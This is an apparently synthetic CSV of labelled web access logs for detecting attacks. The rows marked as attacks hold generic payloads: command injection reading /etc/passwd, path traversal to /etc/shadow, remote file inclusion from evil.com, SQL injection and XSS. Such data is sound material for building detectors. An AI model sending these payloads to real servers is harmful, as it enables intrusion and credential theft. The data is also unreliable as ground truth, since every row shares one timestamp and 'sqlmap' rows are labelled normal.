timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,192.168.0.108,GET,/img/logo.png,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.247,POST,/about,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.211,POST,/profile,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.113,POST,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.41,GET,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.137,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.154,GET,/download?file=../../../../etc/passwd,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.14,GET,/page?file=http://evil.com/shell.txt,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.234,POST,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.141,GET,/download?file=../../../../etc/passwd,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.120,GET,/,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.215,POST,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.225,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.42,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.145,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.151,GET,/profile,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.232,GET,/product?id=10 OR 1=1,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.82,GET,/js/app.js,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.156,GET,/img/logo.png,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.162,GET,/contact,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.2,GET,/product?id=10 OR 1=1,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.161,POST,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.253,POST,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.9,GET,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.41,POST,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.20,POST,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.244,POST,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.240,GET,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.174,POST,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.172,POST,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.121,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.33,GET,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.157,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.101,GET,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.194,POST,/login?user=admin'--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.197,GET,/index.html,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.32,POST,/,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.27,POST,/,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.226,GET,/about,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.69,GET,/contact,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.66,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.69,GET,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.232,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.180,GET,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.128,POST,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.125,POST,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.17,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.63,POST,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.254,POST,/index.html,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.13,POST,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.86,POST,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.171,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.249,POST,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.144,GET,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.149,GET,/ping?ip=127.0.0.1;ls,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.182,GET,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.141,GET,/profile,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.229,POST,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.140,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.42,POST,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.63,GET,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.116,POST,/view?include=../../../../etc/passwd,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.31,POST,/view?include=../../../../etc/passwd,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.34,POST,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.27,GET,/download?file=../../../../etc/passwd,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.250,POST,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.191,GET,/search?q=<script>alert('x')</script>,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.131,GET,/search?q=<script>alert('x')</script>,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.217,POST,/index.html,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.112,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.18,GET,/dashboard,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.235,GET,/cmd?exec=cat%20/etc/passwd,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.180,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.43,GET,/cmd?exec=cat%20/etc/passwd,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.14,GET,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.194,GET,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.126,GET,/img/logo.png,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.215,POST,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.1,POST,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.98,POST,/login?user=admin'--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.111,GET,/profile,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.228,GET,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.97,POST,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.57,GET,/search?q=1' UNION SELECT null--,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.101,GET,/img/logo.png,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.61,GET,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.159,GET,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.58,GET,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.29,POST,/profile,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.88,GET,/search?q=1' UNION SELECT null--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.255,GET,/login?user=admin'--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.7,POST,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.190,POST,/download?file=../../../../etc/passwd,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.140,POST,/login?user=admin'--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.60,GET,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.198,POST,/js/app.js,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.118,POST,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.119,GET,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.144,POST,/dashboard,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.121,POST,/profile,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.34,GET,/search?q=1' UNION SELECT null--,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.191,GET,/search?q=1' UNION SELECT null--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.128,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.22,GET,/img/logo.png,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.95,GET,/download?file=../../../../etc/passwd,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.239,POST,/,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.197,GET,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.169,POST,/favicon.ico,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.29,GET,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.234,POST,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.116,POST,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.22,GET,/favicon.ico,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.168,GET,/cmd?exec=cat%20/etc/passwd,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.206,POST,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.98,POST,/search?q=1' UNION SELECT null--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.219,GET,/js/app.js,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.168,GET,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.43,GET,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.229,POST,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.201,POST,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.10,POST,/product?id=10 OR 1=1,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.129,POST,/contact,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.157,POST,/css/style.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.226,POST,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.128,POST,/js/app.js,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.227,GET,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.96,POST,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.45,POST,/index.html,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.239,POST,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.117,POST,/login?user=admin'--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.112,GET,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.69,POST,/vendor/bootstrap.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.228,POST,/cmd?exec=cat%20/etc/passwd,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.213,POST,/css/style.css,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.234,GET,/js/app.js,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.178,POST,/js/app.js,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.48,POST,/index.html,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.170,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.201,POST,/dashboard,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.244,GET,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.97,GET,/index.html,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.173,POST,/product?id=10 OR 1=1,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.34,POST,/cmd?exec=cat%20/etc/passwd,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.116,POST,/favicon.ico,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.38,POST,/view?include=../../../../etc/passwd,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.220,GET,/index.html,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.48,POST,/search?q=<script>alert('x')</script>,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.131,GET,/profile,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.31,POST,/view?include=../../../../etc/passwd,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.29,POST,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.35,GET,/product?id=10 OR 1=1,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.195,POST,/profile,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.244,GET,/contact,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.92,GET,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.60,POST,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.69,GET,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.162,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.98,GET,/favicon.ico,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.110,POST,/search?q=<script>alert('x')</script>,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.160,POST,/view?include=../../../../etc/passwd,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.223,POST,/page?file=http://evil.com/shell.txt,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.6,GET,/css/style.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.189,POST,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.4,GET,/search?q=1' UNION SELECT null--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.227,POST,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.188,POST,/vendor/bootstrap.css,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.246,POST,/search?q=1' UNION SELECT null--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.187,GET,/product?id=10 OR 1=1,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.54,GET,/cmd?exec=cat%20/etc/passwd,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.81,GET,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.107,GET,/product?id=10 OR 1=1,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.117,GET,/download?file=../../../../etc/passwd,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.208,POST,/contact,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.204,POST,/page?file=http://evil.com/shell.txt,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.18,GET,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.97,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.136,POST,/img/logo.png,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.243,GET,/,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.169,POST,/contact,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.235,POST,/contact,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.118,GET,/ping?ip=127.0.0.1;ls,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.169,GET,/product?id=10 OR 1=1,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.16,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.61,POST,/about,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.89,GET,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.189,GET,/js/app.js,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.237,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.12,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.173,POST,/search?q=<script>alert('x')</script>,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.21,POST,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.231,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.143,GET,/contact,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.111,GET,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.32,GET,/,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.37,GET,/product?id=10 OR 1=1,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.158,GET,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.203,POST,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.91,GET,/js/app.js,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.152,POST,/index.html,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.36,POST,/search?q=<script>alert('x')</script>,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.165,POST,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.219,POST,/js/app.js,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.137,GET,/contact,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.225,POST,/favicon.ico,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.235,GET,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.108,GET,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.41,GET,/favicon.ico,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.232,GET,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.186,GET,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.106,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.104,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.15,GET,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.179,GET,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.200,POST,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.252,GET,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.66,POST,/about,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.13,POST,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.186,POST,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.130,POST,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.203,GET,/index.html,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.178,POST,/css/style.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.12,GET,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.56,POST,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.122,POST,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.122,POST,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.228,GET,/view?include=../../../../etc/passwd,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.171,POST,/about,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.77,GET,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
